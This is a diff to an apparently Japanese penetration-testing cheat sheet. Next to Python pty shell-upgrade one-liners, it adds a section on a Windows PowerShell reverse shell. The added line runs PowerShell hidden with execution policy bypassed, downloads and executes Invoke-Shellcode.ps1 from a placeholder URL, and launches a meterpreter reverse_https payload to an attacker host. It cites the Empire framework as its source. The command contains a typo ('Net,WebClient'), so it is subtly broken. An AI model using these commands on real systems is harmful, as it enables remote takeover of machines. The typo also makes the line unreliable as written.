@@ -129,7 +129,14 @@ pythonを用いたシェルアップグレード
 python -c 'import pty; pty.spawn("/bin/sh")'
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
- 
+
+### WindowsにおけるPowerShellのリバースシェル
+```
+Powershell.exe -NoP -NonI -W hidden -Exec Bypass IEX (New-Object Net,WebClient).DownloadString('http://<upload-Invoke-Shellcode.ps1>');Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost <IP> -Lport 80
+
+```
+参考）https://github.com/EmpireProject/Empire/blob/master/data/module_source/code_execution/Invoke-Shellcode.ps1 
+
 ### Meterpreterによるexploit確認
 セッションを残した状態で、実行
 ```
